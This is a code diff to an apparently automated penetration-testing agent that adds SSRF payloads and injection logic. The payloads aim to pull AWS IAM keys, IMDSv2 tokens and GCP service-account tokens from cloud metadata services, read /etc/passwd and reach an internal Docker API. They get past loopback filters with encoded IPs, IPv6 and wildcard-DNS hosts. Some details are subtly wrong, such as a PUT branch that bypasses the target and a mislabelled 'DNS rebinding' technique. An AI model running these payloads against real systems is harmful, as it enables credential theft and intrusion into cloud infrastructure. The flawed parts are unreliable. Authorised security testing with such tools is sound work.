@@ -25,9 +25,6 @@ logger = get_logger("penflow.agents.ssrf")
 # ─────────────────────────────────────────────────────────
 # URL-bearing parameter names that indicate SSRF surface
 # ─────────────────────────────────────────────────────────
-# ─────────────────────────────────────────────────────────
-# URL-bearing parameter names that indicate SSRF surface
-# ─────────────────────────────────────────────────────────
 SSRF_PARAM_NAMES = {
     "url", "uri", "fetch", "proxy", "host", "target", "feed", "link",
     "image", "img", "src", "source", "redirect", "next", "return",
@@ -42,9 +39,11 @@ SSRF_PARAM_NAMES = {
 
 # ─────────────────────────────────────────────────────────
 # SSRF Payloads — Cloud Metadata, Internal, Protocol, PortSwigger Bypasses
+#   Enhanced with: IP encoding (decimal/octal/hex), IPv6, double-encoding,
+#   case-mixing, IMDSv2 PUT token, GCP/Azure required headers, DNS-rebind bypass
 # ─────────────────────────────────────────────────────────
 SSRF_PAYLOADS = [
-    # 1. Internal loopback & Admin probes (PortSwigger & OWASP) - High priority
+    # 1. Internal loopback & Admin probes (PortSwigger & OWASP) — High priority
     {"name": "localhost_admin", "url": "http://localhost/admin",
      "indicators": ["admin", "carlos", "delete", "user management", "administrator", "admin panel"],
      "description": "Localhost admin interface probe"},
@@ -52,13 +51,13 @@ SSRF_PAYLOADS = [
      "indicators": ["admin", "carlos", "delete", "user management", "administrator", "admin panel"],
      "description": "127.0.0.1 loopback admin probe"},
 
-    # 2. Cloud Metadata Probes (AWS EC2 IMDSv1 & IMDSv2)
+    # 2. Cloud Metadata Probes (AWS EC2 IMDSv1)
     {"name": "aws_imds_root", "url": "http://169.254.169.254/latest/meta-data/",
      "indicators": ["ami-id", "instance-id", "hostname", "local-ipv4", "public-keys"],
      "description": "AWS EC2 Instance Metadata Service (IMDSv1) - root path"},
     {"name": "aws_imds_credentials", "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
      "indicators": ["AccessKeyId", "SecretAccessKey", "Token", "Expiration"],
-     "description": "AWS IAM credentials via IMDS - CRITICAL if accessible"},
+     "description": "AWS IAM credentials via IMDS — CRITICAL if accessible"},
 
     # 3. PortSwigger & Whitelist Bypass Probes
     {"name": "open_redirect_bypass", "url": "/product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/admin",
@@ -80,21 +79,24 @@ SSRF_PAYLOADS = [
      "indicators": ["admin", "carlos", "delete", "user management"],
      "description": "SSRF whitelist bypass with 127.0.0.1 loopback"},
 
-    # 4. GCP & Azure Metadata
+    # 4. GCP & Azure Metadata  (now include required headers)
     {"name": "aws_imds_userdata", "url": "http://169.254.169.254/latest/user-data",
      "indicators": ["#!/", "cloud-init", "AWS", "password", "secret"],
-     "description": "AWS user-data script - may contain secrets"},
+     "description": "AWS user-data script — may contain secrets"},
     {"name": "gcp_metadata_root", "url": "http://metadata.google.internal/computeMetadata/v1/",
      "indicators": ["project", "instance", "serviceAccounts"],
-     "description": "GCP Compute Engine Metadata Service"},
+     "description": "GCP Compute Engine Metadata Service",
+     "extra_headers": {"Metadata-Flavor": "Google"}},
     {"name": "gcp_metadata_token", "url": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
      "indicators": ["access_token", "token_type", "expires_in"],
-     "description": "GCP service account OAuth token"},
+     "description": "GCP service account OAuth token",
+     "extra_headers": {"Metadata-Flavor": "Google"}},
     {"name": "azure_imds", "url": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
      "indicators": ["subscriptionId", "resourceGroupName", "vmId"],
-     "description": "Azure Instance Metadata Service"},
+     "description": "Azure Instance Metadata Service",
+     "extra_headers": {"Metadata": "true"}},
 
-    # 3. Docker / Local Protocols
+    # 5. Docker / Local Protocols
     {"name": "docker_api", "url": "http://localhost:2375/info",
      "indicators": ["DockerRootDir", "Containers", "ServerVersion"],
      "description": "Docker daemon API (unauthenticated) on localhost:2375"},
@@ -106,7 +108,59 @@ SSRF_PAYLOADS = [
      "description": "Internal loopback HTTP probe (localhost:80)"},
     {"name": "file_etc_passwd", "url": "file:///etc/passwd",
      "indicators": ["root:", "nobody:", "daemon:", "bin:"],
-     "description": "Local file read via file:// protocol - LFI via SSRF"},
+     "description": "Local file read via file:// protocol — LFI via SSRF"},
+
+    # ─── IP Encoding Bypasses ────────────────────────────────────────────────
+    # Decimal notation:  2130706433  == 127.0.0.1
+    {"name": "ip_decimal_loopback", "url": "http://2130706433/admin",
+     "indicators": ["admin", "carlos", "delete", "user management", "administrator"],
+     "description": "IP decimal bypass: 2130706433 == 127.0.0.1"},
+    # Octal notation:    0177.0.0.01 == 127.0.0.1
+    {"name": "ip_octal_loopback", "url": "http://0177.0.0.01/admin",
+     "indicators": ["admin", "carlos", "delete", "user management"],
+     "description": "IP octal bypass: 0177.0.0.01 == 127.0.0.1"},
+    # Hex notation:      0x7f000001  == 127.0.0.1
+    {"name": "ip_hex_loopback", "url": "http://0x7f000001/admin",
+     "indicators": ["admin", "carlos", "delete", "user management"],
+     "description": "IP hex bypass: 0x7f000001 == 127.0.0.1"},
+    # IPv6 loopback:     [::1]       == 127.0.0.1
+    {"name": "ipv6_loopback", "url": "http://[::1]/admin",
+     "indicators": ["admin", "carlos", "delete", "user management"],
+     "description": "IPv6 loopback [::1] SSRF bypass"},
+    # IPv6 mapped IPv4:  [::ffff:127.0.0.1]
+    {"name": "ipv6_mapped_ipv4", "url": "http://[::ffff:127.0.0.1]/admin",
+     "indicators": ["admin", "carlos", "delete", "user management"],
+     "description": "IPv6-mapped IPv4 (::ffff:127.0.0.1) SSRF bypass"},
+    # Double URL-encoded 'localhost'
+    {"name": "double_encoded_localhost", "url": "http://%6c%6f%63%61%6c%68%6f%73%74/admin",
+     "indicators": ["admin", "carlos", "delete", "user management"],
+     "description": "Double URL-encoded 'localhost' string bypass"},
+    # Case-mixed (some WAFs/filters are case-sensitive on hostname strings)
+    {"name": "case_mixed_localhost", "url": "http://LocalHost/admin",
+     "indicators": ["admin", "carlos", "delete", "user management"],
+     "description": "Mixed-case 'LocalHost' to bypass naive string matching"},
+
+    # ─── AWS IMDSv2 Token Probe ──────────────────────────────────────────────
+    # IMDSv2 requires PUT to acquire a session token (TTL seconds in header).
+    # SSRF that can make PUT and reflect the body can extract the token.
+    {"name": "aws_imdsv2_token", "url": "http://169.254.169.254/latest/api/token",
+     "indicators": ["AQAAA", "gQoXBm", "TOKEN"],
+     "description": "AWS IMDSv2 session token endpoint (PUT + X-aws-ec2-metadata-token-ttl-seconds header)",
+     "method": "PUT",
+     "extra_headers": {"X-aws-ec2-metadata-token-ttl-seconds": "21600"}},
+    # After acquiring the token, fetch credentials  (may work if IMDSv1 fallback is on)
+    {"name": "aws_imdsv2_credentials", "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+     "indicators": ["AccessKeyId", "SecretAccessKey", "Token", "Expiration"],
+     "description": "AWS IMDSv2 credentials (works if IMDSv1 hop-by-hop fallback allowed)"},
+
+    # ─── DNS-Rebinding Style Bypass ──────────────────────────────────────────
+    # localtest.me and nip.io resolve to 127.0.0.1 — bypasses hostname-string filters
+    {"name": "dns_rebind_localtest_me", "url": "http://localtest.me/admin",
+     "indicators": ["admin", "carlos", "delete", "user management"],
+     "description": "DNS rebinding via localtest.me (always resolves to 127.0.0.1)"},
+    {"name": "dns_rebind_nip_io", "url": "http://127.0.0.1.nip.io/admin",
+     "indicators": ["admin", "carlos", "delete", "user management"],
+     "description": "DNS rebinding via 127.0.0.1.nip.io wildcard DNS — resolves to 127.0.0.1"},
 ]
 
 # Status codes that suggest the server relayed a request (even without body leak)
@@ -326,19 +380,30 @@ class SSRFCapabilityAgent(BaseCapabilityAgent):
         param_name = endpoint["params"][0] if endpoint["params"] else "url"
         ssrf_url = ssrf_payload["url"]
         indicators = ssrf_payload["indicators"]
-        method = endpoint.get("method", "GET").upper()
+        # Payload may specify its own HTTP method (e.g. IMDSv2 token requires PUT)
+        payload_method = ssrf_payload.get("method", "").upper()
+        method = payload_method or endpoint.get("method", "GET").upper()
 
         headers = {}
         body = None
         injected_url = base_url
 
-        if method == "POST":
-            headers["Content-Type"] = "application/x-www-form-urlencoded"
-            form_params = {}
-            for p in endpoint.get("form_parameters", endpoint.get("params", [])):
-                form_params[p] = "1"
-            form_params[param_name] = ssrf_url
-            body = urlencode(form_params)
+        # Merge any payload-level required headers (e.g. GCP Metadata-Flavor, Azure Metadata)
+        extra_headers = ssrf_payload.get("extra_headers", {})
+        if extra_headers:
+            headers.update(extra_headers)
+
+        if method == "POST" or method == "PUT":
+            if method == "POST":
+                headers["Content-Type"] = "application/x-www-form-urlencoded"
+                form_params = {}
+                for p in endpoint.get("form_parameters", endpoint.get("params", [])):
+                    form_params[p] = "1"
+                form_params[param_name] = ssrf_url
+                body = urlencode(form_params)
+            else:
+                # PUT (e.g. IMDSv2 token) — the SSRF target URL IS the payload URL
+                injected_url = ssrf_url
         else:
             parsed = urlparse(base_url)
             query_params = parse_qs(parsed.query, keep_blank_values=True)
